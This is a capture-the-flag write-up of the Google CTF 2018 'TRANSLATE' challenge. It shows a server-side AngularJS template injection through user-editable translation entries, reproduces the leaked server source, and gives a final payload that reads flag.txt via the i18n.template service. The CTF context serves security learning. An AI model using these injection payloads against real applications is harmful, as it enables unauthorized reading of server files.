---
layout: post
title: Google CTF 2018 Quals TRANSLATE
category: ctf
tags: googlectf
---

> Client-side rendering, but not in a browser! Get the flag in ./flag.txt, and seeing the source will likely help.


This challenge is absolutely server-side challenge but also related to AngularJS. AngularJS is front-end web application framework but this year Google CTF organizer combined these stuff into an interesting server-side web challenge. This reminds me last year's "The X Sanitizer" which contains service worker behaving as a local server but actually that was a XSS challenge :)


## Overview
Anyway, let's take a look into challenge files:

```html
<script>location='http://translate.ctfcompetition.com:1337'</script>
```

![index.png](/assets/googlectf-2018-quals-2018-translate/index.png)

It seems like a translator application between French and English. Here is list functions for this challenge.

* translation (francais, english)
  * supports French and English
  * translating `informatique en nuage` to French, it says:  
  ![translation.png](/assets/googlectf-2018-quals-2018-translate/translation.png){:width="80%"}
* add words
  * user can register new translation.  
  ![add_words1.png](/assets/googlectf-2018-quals-2018-translate/add_words1.png){:width="40%"}
  * there is interesting error on trying to add non-existent language.  
  ![add_words2.png](/assets/googlectf-2018-quals-2018-translate/add_words2.png){:width="80%"}
    * actually there is no directory traversal stuff here :(
* debug translations
  * there is internal data on `debug translations`:  
  ![debug.png](/assets/googlectf-2018-quals-2018-translate/debug.png)
* reset challenge
  * remove all translation entry added by user


So this application seems to use two object holding translation map. 

## Vulnerability
Some interesting string included as you can see in debug translations : **\{\{userQuery\}\}**  
The object key of this value is `in_lang_query_is_spelled`. Just translating this word, it says

```{% raw %}
In french, <b>{{userQuery}}</b> is spelled <b ng-bind="i18n.word(userQuery)"></b>..
{% endraw %}```

this is same text as you can see in translation result.
![trans.png](/assets/googlectf-2018-quals-2018-translate/trans.png){:width="80%"}

So what will happen on updating this key? AngularJS uses double curly braces as template tag, let's try update this key (actually word) with `{% raw %}{{1 + 1}}{% endraw %}`. 

![inject1.png](/assets/googlectf-2018-quals-2018-translate/inject1.png){:width="50%"}
![inject2.png](/assets/googlectf-2018-quals-2018-translate/inject2.png){:width="40%"}

And it shows `2` on translating something. Also `input_query` key is also vulnable. This key is better because you can see in query window (you don't have to query translate).

`{% raw %}{{1 + 1}}{% endraw %}`  
![inject3.png](/assets/googlectf-2018-quals-2018-translate/inject3.png){:width="40%"}


On trying some invalid expression, also I got an error including AngularJS version.

`{% raw %}{{{}}}}{% endraw %}`  
![error.png](/assets/googlectf-2018-quals-2018-translate/error.png)


Then it seems to be server-side template injection. Next step is to get source code as the description says.

Looking into html, I found the tag something like AngularJS directive: 
```html
<div my-include="static/footer.html">
```

maybe this tag would work like `ng-include`. So tried to leak `/usr/local/chall/srcs/server.js` putting `<div my-include="srcs/server.js">` and it works, but it couldn't leak `./flag.txt`.

```javascript
// ./srcs/server.js

const cookieParser = require('cookie-parser')
const uuidv4 = require('uuid/v4');

// note: To let Domino run in there,
//   sed -i "61s/\'use strict\'//" node_modules/vm2/lib/sandbox.js

const {NodeVM} = require('vm2');
const restrictedFs = require('./restricted_fs.js');

const Memcache = require('memcached-promisify');

////////////////////////////////
// Memcache functions
////////////////////////////////

const memcache = new Memcache({'cacheHost': '127.0.0.1:11211'});

function read_dictionary(id, lang) {
  let key = `${id}_${lang}`;
  return memcache.get(key).then((result) => {
      if (!result)
          return JSON.parse(restrictedFs.load(`i18n/${lang}.json`));
      return result;
  }).catch(console.error);
}

function write_dictionary(id, lang, data) {
  let key = `${id}_${lang}`;
  return memcache.set(key, data, 1*60*60 /*1 hour*/).then(() => {
    return `${id}_${lang}`;
  }).catch(console.error);
}

function delete_dictionary(id, lang) {
  let key = `${id}_${lang}`;
  return memcache.del(key).catch(console.error);
}


////////////////////////////////
// Renderer utilities
////////////////////////////////

function renderHtml(html) {
  var response = '';
  response += restrictedFs.load('static/header.html');
  response += html;
  response += restrictedFs.load('static/footer.html');
  return response;
}

function renderStatic(relativePath) {
  var response = '';
  response += restrictedFs.load('static/header.html');
  response += restrictedFs.load(relativePath);
  response += restrictedFs.load('static/footer.html');
  return response;
}

function renderError(error) {
  console.log(error);
  return renderHtml(`
  Something broke: ${error}<hr>
  <a href="/reset">reset the challenge</a> or <a href="/">go back</a>`);
}

function renderWithAngular(givenScope, lang, fs, ip) {
  try {
    // Remember the AngularJS sandbox? Only 2010's kids remember.
    const sandbox = new NodeVM ({
      require: {
        external: true,
        builtin: false,
        root: "./",
        import: [
          `./srcs/sandboxed/angularjs_for_domino.js`,
          `./srcs/sandboxed/app.js`,
          `domino`
        ],
        context: 'sandbox',
      },
      sandbox: {},
    });

    let ds = async (lang) => await read_dictionary(ip, lang);

    let renderAngularApp = sandbox.run(`
      const domino = require('domino');
      const initAngularJS = require('./srcs/sandboxed/angularjs_for_domino.js');
      const angularApp = require('./srcs/sandboxed/app.js');
      const I18n = require('./srcs/sandboxed/i18n.js');

      module.exports = async (givenScope, lang, fs, ds) => {
          const i18n = I18n.build(fs, ds);
          const window = domino.createWindow(
              await i18n.forTemplateWithLang(lang, './templates/template.html'),
              'nowhere://¯\\_(ツ)_/¯');
          initAngularJS(window);
          try {
            await angularApp(window, givenScope, i18n, lang);
            return window.document.innerHTML;
          } catch (error) {
            return '' +
                'You broke my AngularJS :( ' + error + '<hr>' +
                '<a href="/reset">reset the challenge</a> or <a href="/">go back</a>' +
                '';
          }
      }
    `, 'server.js');

    return renderAngularApp(givenScope, lang, restrictedFs, ds);
  } catch (e) {
    return renderError(e);
  }
}


////////////////////////////////
// Server setup
////////////////////////////////

const app = express();
const LANG = 'en';

app.set('trust proxy', true);

app.use(cookieParser());


app.use(function (req, res, next) {
  if (req.cookies.sid && req.cookies.sid.toString().match(/^[0-9a-f-]+$/)) {
    req.uid = req.cookies.sid+'';
  } else {
    let uid = uuidv4();
    req.uid = uid;
    res.cookie('sid', uid);
  }
  next();
});

////////////////////////////////
// Routing
////////////////////////////////

app.get('/', async (req, res) => {
  const lang = req.query['lang'] ? req.query['lang'] : LANG;
  const userQuery = req.query['query'] ? req.query['query'] : null;
  res.send(await renderWithAngular({userQuery:userQuery}, lang, restrictedFs, req.uid));
});

// Append to the dictionnaries
app.get('/add', (req, res) => {
  const [word, translated, lang] =
      [req.query['word'],  req.query['translated'], req.query['lang']];

  if (word && translated && lang) {
      let defaultTranslations = JSON.parse(restrictedFs.load(`i18n/${lang}.json`));
      read_dictionary(req.uid, lang).then((translations) => {
      if (!translations)
        translations = defaultTranslations;
        translations[word] = translated;
        return write_dictionary(req.uid, lang, translations);
      }).then(() => {
        res.send(renderHtml(
          `wrote down that ${word} translates to ${translated} in ${lang}.
          <a href="/">go back</a>`));
      }).catch((e) => {
        res.send(renderError(e));
      });
  } else {
    res.send(renderStatic('/static/add.html'));
  }
});

// Display the dictionnaries
app.get('/dump', async (req, res) => {
  let en = await read_dictionary(req.uid, 'en');
  let fr = await read_dictionary(req.uid, 'fr');

  res.send(renderHtml(`
    english dictionary: ${JSON.stringify(en)} <hr>
    french dictionary:  ${JSON.stringify(fr)} <hr>
    <a href="/">go back</a>
  `));
});

// A simple endpoint that resets all.
app.get('/reset', (req, res) => {
  delete_dictionary(req.uid, 'en');
  delete_dictionary(req.uid, 'fr');
  res.send(renderStatic('static/reset_done.html'));
});

app.listen(1337, () => console.log('listening on port 1337'));
```

four interesting files here: `./restricted_fs`, `./srcs/sandboxed/angularjs_for_domino.js`, `./srcs/sandboxed/app.js` and `./srcs/sandboxed/i18n.js`. But I couldn't get `angularjs_for_domino.js` for some reason.

```javascript
// ./srcs/restricted_fs.js

const fs = require('fs'); // the builtin

function load(fileName) {
  // If it's not a reasonable charset or there's .. inside, throw
  if (!fileName.match(/^[/\-\_\.\d\w]+$/) || fileName.match(/\.\./)) {
    throw new Error(`FS abuse detected when trying to load ${file}`);
  }
  return String(fs.readFileSync('./' + fileName));
}

module.exports = {
  load:load,
};
```

```javascript
// ./srcs/sandboxed/app.js

async function setAppUp(window, givenScope, i18n, lang) {
  // Start the Angular machine.
  var app = window.angular.module('demo', []);

  await i18n.setupAngularService(app, lang);

  // Make the errors appear.
  app.factory('$exceptionHandler', function() {
    return function myExceptionHandler(exception, cause) {
      throw new Error(exception);
    };
  });

  // Remove debug info, nobody cares.
  app.config(function($compileProvider, $sceDelegateProvider) {
    $compileProvider.debugInfoEnabled(false);
  });

  // App functionnality
  app.controller('paramsController', function($window, $scope, i18n) {
    $scope.window = $window;
    $scope.i18n = i18n;
    for (const k of Object.keys(givenScope)) {
      $scope[k] = givenScope[k];
    }
  });

  // A directive to load internationalized templates.
  app.directive('myInclude', ($compile, $sce, i18n) => {
    var recursionCount = 0;

    return {
      restrict: 'A',
      link: (scope, element, attrs) => {
        if (!attrs['myInclude'].match(/\.html$|\.js$|\.json$/)) {
          throw new Error(`Include should only include html, json or js files ಠ_ಠ`);
        }
        recursionCount++;
        if (recursionCount >= 20) {
          // ng-include a template that ng-include a template that...
          throw Error(`That's too recursive ಠ_ಠ`);
        }
        element.html(i18n.template(attrs['myInclude']));
        $compile(element.contents())(scope);
      }
    };
  });

  // And we're ready to bootstrap and render.
  window.angular.bootstrap(window.document, ['demo']);
}

module.exports = setAppUp;
```

```javascript
// ./srcs/sandboxed/i18n.js

class I18n {

  constructor(fs, ds) {
    this.fs = fs;
    this.ds = ds;
    this.translations = {};
  }

  translationsForLang_(lang) {
    let translations = {};
    if (!lang.match(/^\w+$/)) {
      throw new Error('Badness detected in the language field');
    }

    return this.ds(lang).then((translations) => {
      this.translations = translations;
      return translations;
    }).catch((e) => {
      console.log(e);
      throw new Error(`Canmot open dictionnary: ${e}`);
    });
  }

  forSingleWord(word) {
    return this.translations[word];
  }

  translate_(translations, template) {
    var templateValue;
    try {
      templateValue = this.fs.load(template);
    } catch (e) {
      return `Couldn't load template: ${e}`;
    }
    for (const k of Object.keys(translations)) {
      templateValue = templateValue.replace(
          new RegExp(`\\[\\[${k}\\]\\]`, 'g'), translations[k]);
    }
    return templateValue;
  }

  async forTemplateWithLang(lang, template) {
    let translations = await this.translationsForLang_(lang);
    return this.translate_(translations, template);
  }

  forTemplate(template) {
    return this.translate_(this.translations, template);
  }

  async setupAngularService(app, lang) {
    const myI18n = this;

    await this.translationsForLang_(lang);

    app.service('i18n', function() {
      return {
        template: (t) => myI18n.forTemplate(t),
        word: (w) => myI18n.forSingleWord(w),
      }
    });
  }

}

module.exports = {
  build: (fs, ds) => new I18n(fs, ds)
};
```

There is some restriction on the app:
* filesystem
  * restricted_fs.js
    * prevent loading file from upper directory
  * `my-include` directive
    * prevent loading file except `.html`, `.js` and `.json`
* vm2 sandbox
  * prevent access to most of nodejs objects


basically there seems to be no sandbox escape on vm2 and AngularJS (v1.6.9), and the goal is to read file without `my-include` directive.

So let's search avalable object in this context.
The first idea I thought was using `process` but there are no useful modules here.
So how about AngularJS stuff? I found that `window` object is available:

`{% raw %}{{window}}{% endraw %}`  
![window.png](/assets/googlectf-2018-quals-2018-translate/window.png){:width="40%"}

So this means the scope is under angular app, where `i18n` object is also available:

```javascript
  app.controller('paramsController', function($window, $scope, i18n) {
    $scope.window = $window;
    $scope.i18n = i18n;
    for (const k of Object.keys(givenScope)) {
      $scope[k] = givenScope[k];
    }
  });
```

`{% raw %}{{i18n}}{% endraw %}`  
![i18n.png](/assets/googlectf-2018-quals-2018-translate/i18n.png){:width="40%"}


The goal is almost there! Because `i18n` has `template_` (connected to `template`) method which loads arbitrary file as template:
```javascript
  translate_(translations, template) {
    var templateValue;
    try {
      templateValue = this.fs.load(template);
    } catch (e) {
      return `Couldn't load template: ${e}`;
    }
    for (const k of Object.keys(translations)) {
      templateValue = templateValue.replace(
          new RegExp(`\\[\\[${k}\\]\\]`, 'g'), translations[k]);
    }
    return templateValue;
  }

  ...

  forTemplate(template) {
    return this.translate_(this.translations, template);
  }  

  ...

    app.service('i18n', function() {
      return {
        template: (t) => myI18n.forTemplate(t),
        word: (w) => myI18n.forSingleWord(w),
      }
    });  

  ...
```

Finally I could leak flag with `i18n.template`

`{% raw %}{{i18n.template("./flag.txt")}}{% endraw %}`  
![flag.png](/assets/googlectf-2018-quals-2018-translate/flag.png){:width="60%"}
